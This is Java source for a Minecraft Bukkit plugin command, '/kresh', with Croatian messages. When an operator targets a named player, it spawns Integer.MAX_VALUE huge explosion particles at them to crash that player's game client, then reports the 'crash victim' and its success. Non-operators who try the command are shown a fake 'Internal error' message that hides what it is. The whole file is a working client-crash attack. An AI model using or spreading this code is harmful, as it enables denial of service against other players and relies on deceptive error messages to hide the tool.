package io.github.tunafishyy.onk.Commands;

import io.github.tunafishyy.onk.ONK;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Particle;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.configuration.file.FileConfiguration;
import org.bukkit.entity.Player;

public class Kresh implements CommandExecutor {

    private final FileConfiguration config = ONK.getPlugin().getConfig();
    private final String prefix = config.getString("prefix");
    private final boolean setPrefix = config.getBoolean("set-prefix");

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (sender instanceof Player) {
            Player p = (Player) sender;
            Player target;

            if (p.isOp()) {

                if (args.length == 0) {
                    if (setPrefix) {
                        p.sendMessage(prefix + "Uporaba: " + ChatColor.RED + "/kresh <igrac>");
                        p.sendMessage(prefix + "Posalje Iteger.MAX_VALUE broj partikli navedenome igracu.");
                        return true;
                    } else {
                        p.sendMessage("Upotreba: " + ChatColor.RED + "/kresh <igrac>");
                        p.sendMessage("Posalje Iteger.MAX_VALUE broj partikli navedenome igracu.");
                    }
                    return true;
                } else {
                    target = Bukkit.getPlayerExact(args[0]);

                    if (target != null) {
                        target.spawnParticle(Particle.EXPLOSION_HUGE, target.getLocation(), Integer.MAX_VALUE);

                        if (setPrefix) {
                            p.sendMessage(prefix + ChatColor.RED + "Zrtva crasha: " + ChatColor.WHITE + "" + target.getName());
                            p.sendMessage(prefix + ChatColor.RED + "Uspjesnost: " + ChatColor.GREEN + "" + "DA");
                            return true;
                        } else {
                            p.sendMessage(ChatColor.RED + "Zrtva crasha: " + ChatColor.WHITE + "" + target.getName());
                            p.sendMessage(ChatColor.RED + "Uspjesnost: " + ChatColor.GREEN + "" + "DA");
                        }
                        return true;
                    } else {

                        if (setPrefix) {
                            p.sendMessage(prefix + ChatColor.RED + "Nemoguce pronaci zrtvu.");
                            return true;
                        } else {
                            p.sendMessage(ChatColor.RED + "Nemoguce pronaci zrtvu.");
                        }
                    }

                }

                return true;
            } else {
                p.sendMessage(ChatColor.RED + "Internal error [JSON/ PARSE]/.");
                return true;
            }

        }
        return false;
    }
}
